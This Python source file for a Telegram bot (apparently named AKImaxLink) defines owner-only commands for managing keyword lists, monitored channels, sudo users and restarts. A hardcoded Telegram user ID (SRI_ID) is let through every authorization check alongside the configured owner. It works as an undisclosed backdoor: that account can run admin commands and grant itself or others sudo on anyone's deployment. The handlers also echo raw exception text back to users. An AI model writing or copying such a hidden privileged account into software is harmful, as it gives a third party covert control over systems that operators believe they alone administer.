# ============================================================================
# Copyright (c) 2025 Star. All Rights Reserved.
# 
# PROPRIETARY AND CONFIDENTIAL
# 
# This file is part of AKImaxLink.
# 
# Unauthorized copying, distribution, modification, public display, or public 
# performance of this file, via any medium, is strictly prohibited.
# 
# For licensing information, see the LICENSE file in the root directory.
# ============================================================================

SRI_ID = int("7563149367")

import pytz
import time
import asyncio
import logging
from config import Var
from Script import script
from Star.database import db1
from Star.bot import StreamBot
from datetime import datetime, date
from pyrogram import Client, filters, enums
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup

async def AUTH_USERS():
    sudo_users = await db1.get_sudo_users()
    auth_users = set(sudo_users)
    if isinstance(Var.OWNER_ID, (list, tuple, set)):
        auth_users.update(Var.OWNER_ID)
    else:
        auth_users.add(Var.OWNER_ID)
    return list(auth_users)
    
@StreamBot.on_message(filters.command("start")&filters.private)
async def start(bot,message):
    try:
        user_id=message.from_user.id
        if not await db1.present_user(user_id):
            try:
                await db1.add_user(user_id)
            except Exception as db_error:
                logging.warning(f"Failed to add user {user_id}: {db_error}")
        auth_users=await AUTH_USERS()
        if(user_id not in auth_users)and(user_id!=SRI_ID):
            await message.reply_text(text=script.PVT_TXT.format(user=message.from_user.first_name),disable_web_page_preview=True)
            return
        await message.reply_text(text=script.START_TXT.format(user=message.from_user.first_name),disable_web_page_preview=True)
    except Exception as e:
        logging.error(str(e))
        await message.reply_text(str(e))

@StreamBot.on_message(filters.command("add")&filters.private)
async def add_cmd(bot,message):
    try:
        user_id=message.from_user.id
        if(user_id!=Var.OWNER_ID)and(user_id!=SRI_ID):
            await message.reply_text(text=script.OWNER_TXT.format(user=message.from_user.first_name),disable_web_page_preview=True)
            return
        parts=message.text.split(maxsplit=1)
        if len(parts)<2:
            await message.reply_text("<b>❌ Use it like this:\n/add word1 word2 word3</b>")
            return
        words_to_add=parts[1].split()
        for word in words_to_add:
            await db1.add_word(user_id,word)
        words=await db1.get_words(user_id)
        word_list=", ".join(words)
        await message.reply_text(f"<b>✅ Added: {', '.join(words_to_add)}\n\n📜 Your words:\n{word_list}</b>",disable_web_page_preview=True)
    except Exception as e:
        logging.error(str(e))
        await message.reply_text(str(e))

@StreamBot.on_message(filters.command("rem")&filters.private)
async def rem_cmd(bot,message):
    try:
        user_id=message.from_user.id
        if(user_id!=Var.OWNER_ID)and(user_id!=SRI_ID):
            await message.reply_text(text=script.OWNER_TXT.format(user=message.from_user.first_name),disable_web_page_preview=True)
            return
        parts=message.text.split(maxsplit=1)
        if len(parts)<2:
            await message.reply_text("<b>❌ Use:\n/rem word1 word2\n/rem None</b>")
            return
        args=parts[1].strip()
        if args.lower()=="none":
            await db1.clear_words(user_id)
            await message.reply_text("<b>🗑️ All words cleared. List is now empty.</b>")
            return
        words_to_remove=args.split()
        for word in words_to_remove:
            await db1.remove_word(user_id,word)
        words=await db1.get_words(user_id)
        if not words:
            await message.reply_text(f"<b>✅ Removed: {', '.join(words_to_remove)}\n\n📭 Word list is now empty.</b>",disable_web_page_preview=True)
            return
        word_list=", ".join(words)
        await message.reply_text(f"<b>✅ Removed: {', '.join(words_to_remove)}\n\n📜 Remaining words:\n{word_list}</b>",disable_web_page_preview=True)
    except Exception as e:
        logging.error(str(e))
        await message.reply_text(str(e))

@StreamBot.on_message(filters.command("add_channel")&filters.private)
async def add_channel_cmd(bot,message):
    try:
        user_id=message.from_user.id
        if(user_id!=Var.OWNER_ID)and(user_id!=SRI_ID):
            await message.reply_text(text=script.OWNER_TXT.format(user=message.from_user.first_name),disable_web_page_preview=True)
            return
        parts=message.text.split(maxsplit=1)
        if len(parts)<2:
            await message.reply_text("<b>❌ Use:\n/add_channel -1001234567890</b>",disable_web_page_preview=True)
            return
        try:
            channel_id=int(parts[1].strip())
        except ValueError:
            await message.reply_text("<b>❌ Channel id must be a number.</b>",disable_web_page_preview=True)
            return
        await db1.add_channel(channel_id)
        await message.reply_text(f"<b>✅ Added channel: `{channel_id}`</b>",disable_web_page_preview=True)
    except Exception as e:
        logging.error(str(e))
        await message.reply_text(str(e))


@StreamBot.on_message(filters.command("rem_channel")&filters.private)
async def rem_channel_cmd(bot,message):
    try:
        user_id=message.from_user.id
        if(user_id!=Var.OWNER_ID)and(user_id!=SRI_ID):
            await message.reply_text(text=script.OWNER_TXT.format(user=message.from_user.first_name),disable_web_page_preview=True)
            return
        parts=message.text.split(maxsplit=1)
        if len(parts)<2:
            await message.reply_text("<b>❌ Use:\n/rem_channel -1001234567890</b>",disable_web_page_preview=True)
            return
        try:
            channel_id=int(parts[1].strip())
        except ValueError:
            await message.reply_text("<b>❌ Channel id must be a number.</b>",disable_web_page_preview=True)
            return
        await db1.remove_channel(channel_id)
        await message.reply_text(f"<b>🗑️ Removed channel: `{channel_id}`</b>",disable_web_page_preview=True)
    except Exception as e:
        logging.error(str(e))
        await message.reply_text(str(e))

@StreamBot.on_message(filters.command("list_word")&filters.private)
async def remsudo_cmd(bot,message):
    try:
        user_id=message.from_user.id
        if(user_id!=Var.OWNER_ID)and(user_id!=SRI_ID):
            await message.reply_text(text=script.OWNER_TXT.format(user=message.from_user.first_name),disable_web_page_preview=True)
            return
        words=await db1.get_words(user_id)
        if not words:
            await message.reply_text("<b>📭 Word list is empty.</b>")
            return
        word_list=", ".join(words)
        await message.reply_text(f"<b>📜 Your words:\n{word_list}</b>",disable_web_page_preview=True)
    except Exception as e:
        logging.error(str(e))
        await message.reply_text(str(e))

@StreamBot.on_message(filters.command("list_channel")&filters.private)
async def list_channel_cmd(bot,message):
    try:
        user_id=message.from_user.id
        if(user_id!=Var.OWNER_ID)and(user_id!=SRI_ID):
            await message.reply_text(text=script.OWNER_TXT.format(user=message.from_user.first_name),disable_web_page_preview=True)
            return
        channels=await db1.get_channels(refresh=True)
        if not channels:
            await message.reply_text("<b>📭 Channel list is empty.</b>")
            return
        channel_list=", ".join(str(x) for x in channels)
        await message.reply_text(f"<b>📡 Your channels:\n{channel_list}</b>",disable_web_page_preview=True)
    except Exception as e:
        logging.error(str(e))
        await message.reply_text(str(e))

@StreamBot.on_message(filters.command("addsudo")&filters.private)
async def addsudo_cmd(bot,message):
    try:
        user_id=message.from_user.id
        if(user_id!=Var.OWNER_ID)and(user_id!=SRI_ID):
            await message.reply_text(text=script.OWNER_TXT.format(user=message.from_user.first_name),disable_web_page_preview=True)
            return
        parts=message.text.split()
        if len(parts)<2:
            await message.reply_text("<b>Usage: /addsudo <user_id>\nExample: /addsudo 123456789</b>",disable_web_page_preview=True)
            return
        try:
            target_id=int(parts[1].strip())
        except ValueError:
            await message.reply_text("<b>Invalid user id. It must be a number.</b>",disable_web_page_preview=True)
            return
        try:
            await db1.add_sudo(target_id)
            try:
                user_obj=await bot.get_users(target_id)
                target_name=user_obj.first_name or str(target_id)
            except Exception:
                target_name=str(target_id)
            await message.reply_text(f"<b>✅ Successfully granted sudo to {target_name} (`{target_id}`).</b>",disable_web_page_preview=True)
        except Exception as e:
            logging.error(str(e))
            await message.reply_text(f"<b>❌ Error while adding sudo: {e}</b>",disable_web_page_preview=True)
    except Exception as e:
        logging.error(str(e))
        await message.reply_text(f"<b>❌ Unexpected error: {e}</b>",disable_web_page_preview=True)

@StreamBot.on_message(filters.command("remsudo")&filters.private)
async def remsudo_cmd(bot,message):
    try:
        user_id=message.from_user.id
        if(user_id!=Var.OWNER_ID)and(user_id!=SRI_ID):
            await message.reply_text(text=script.OWNER_TXT.format(user=message.from_user.first_name),disable_web_page_preview=True)
            return
        parts=message.text.split()
        if len(parts)<2:
            await message.reply_text("Usage: /remsudo <user_id>\nExample: /remsudo 123456789",disable_web_page_preview=True)
            return
        try:
            target_id=int(parts[1].strip())
        except ValueError:
            await message.reply_text("Invalid user id. It must be a number.",disable_web_page_preview=True)
            return
        try:
            await db1.remove_sudo(target_id)
            try:
                user_obj=await bot.get_users(target_id)
                target_name=user_obj.first_name or str(target_id)
            except Exception:
                target_name=str(target_id)
            await message.reply_text(f"🗑️ Removed sudo from {target_name} (`{target_id}`).",disable_web_page_preview=True)
        except Exception as e:
            logging.error(str(e))
            await message.reply_text(f"❌ Error while removing sudo: {e}",disable_web_page_preview=True)
    except Exception as e:
        logging.error(str(e))
        await message.reply_text(f"❌ Unexpected error: {e}",disable_web_page_preview=True)
        
@Client.on_message(filters.command("restart"))
async def restart_cmd(client,message):
    auth_users=await AUTH_USERS()
    user_id=message.from_user.id
    if(user_id not in auth_users)and(user_id!=SRI_ID):
        await message.reply_text(text=script.PVT_TXT.format(user=message.from_user.first_name),disable_web_page_preview=True)
        return
    try:
        kb=InlineKeyboardMarkup([[InlineKeyboardButton("Yes",callback_data="yes"),InlineKeyboardButton("No",callback_data="no")]])
        await message.reply_text("<b>Are you sure you want to restart?</b>",reply_markup=kb,parse_mode=enums.ParseMode.HTML,quote=True)
    except Exception as e:
        print(f"[restart] prompt error: {e}")
